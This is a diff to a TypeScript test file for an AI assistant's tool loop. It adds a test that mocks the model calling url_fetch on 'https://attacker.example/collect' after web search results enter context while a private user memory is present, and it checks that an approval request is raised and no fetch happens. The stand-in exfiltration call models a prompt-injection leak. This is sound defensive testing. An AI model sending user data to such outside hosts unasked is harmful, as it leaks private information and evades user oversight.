@@ -15,6 +15,7 @@ vi.mock('./tool-loop-anthropic', () => ({
 
 import { runToolLoop, searchResultsEvent } from './tool-loop';
 import type { ProcessedRequest } from './request-processor';
+import { urlFetchToolDef } from '@/lib/url-fetch/url-fetch-tool';
 import {
   webSearchToolDef,
   WEB_SEARCH_MAX_CALLS_PER_TURN,
@@ -398,6 +399,51 @@ describe('tool-loop web_search integration', () => {
     }
   });
 
+  it('asks before url_fetch egress once web content is in context and the turn carries private data', async () => {
+    factoryMocks.streamRequest
+      .mockResolvedValueOnce(
+        twoToolCallStream([
+          { toolName: 'web_search', args: { query: 'today news' }, callId: 'ws' },
+        ]),
+      )
+      .mockResolvedValueOnce(
+        twoToolCallStream([
+          {
+            toolName: 'url_fetch',
+            args: { url: 'https://attacker.example/collect' },
+            callId: 'uf',
+          },
+        ]),
+      )
+      .mockResolvedValueOnce(finalAnswerStream('done'));
+
+    const fetchMock = vi.fn(async (url: string) => {
+      if (url === 'https://api.perplexity.ai/search') return perplexitySearchResponse();
+      return new Response('<html><body>leak</body></html>', {
+        status: 200,
+        headers: { 'content-type': 'text/html' },
+      });
+    });
+    vi.stubGlobal('fetch', fetchMock);
+    vi.stubEnv('PERPLEXITY_API_KEY', 'pplx-test-key');
+
+    try {
+      const processed = {
+        ...makeProcessed([webSearchToolDef(), urlFetchToolDef()]),
+        autoMemoryFacts: ['User is negotiating a job offer with Acme'],
+      } as ProcessedRequest;
+      const output = await collect(runToolLoop(processed, { approvalMode: 'auto' }));
+
+      expect(output).toContain('x_tool_approval_request');
+      expect(fetchMock.mock.calls.map(([url]) => url)).not.toContain(
+        'https://attacker.example/collect',
+      );
+    } finally {
+      vi.unstubAllGlobals();
+      vi.unstubAllEnvs();
+    }
+  });
+
   it('keeps url_fetch and web_search sources in SEPARATE cumulative lists, each with its own correct shape', async () => {
     factoryMocks.streamRequest
       .mockResolvedValueOnce(
@@ -420,7 +466,9 @@ describe('tool-loop web_search integration', () => {
 
     try {
       const output = await collect(
-        runToolLoop(makeProcessed([webSearchToolDef()]), { approvalMode: 'auto' }),
+        runToolLoop(makeProcessed([webSearchToolDef(), urlFetchToolDef()]), {
+          approvalMode: 'auto',
+        }),
       );
 
       const events = output
